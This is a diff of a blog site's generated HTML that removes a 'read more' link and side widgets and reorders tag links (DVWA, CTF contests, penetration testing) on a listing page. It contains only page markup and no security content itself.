-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">DVWA</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/Knlvre.github-io/2019/02/13/DVWA 4-File Inclusion（文件包含）/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
       <a class="extend prev" rel="prev" href="/Knlvre.github-io/page/3/">&laquo; Prev</a><a class="page-number" href="/Knlvre.github-io/">1</a><a class="page-number" href="/Knlvre.github-io/page/2/">2</a><a class="page-number" href="/Knlvre.github-io/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/Knlvre.github-io/page/5/">5</a><a class="page-number" href="/Knlvre.github-io/page/6/">6</a><a class="extend next" rel="next" href="/Knlvre.github-io/page/5/">Next &raquo;</a>
@@ -1695,15 +1665,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">CTF比赛</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">渗透测试</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">DVWA</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">CTF比赛</a>
               </li>
              
               <li class="article-tag-list-item">
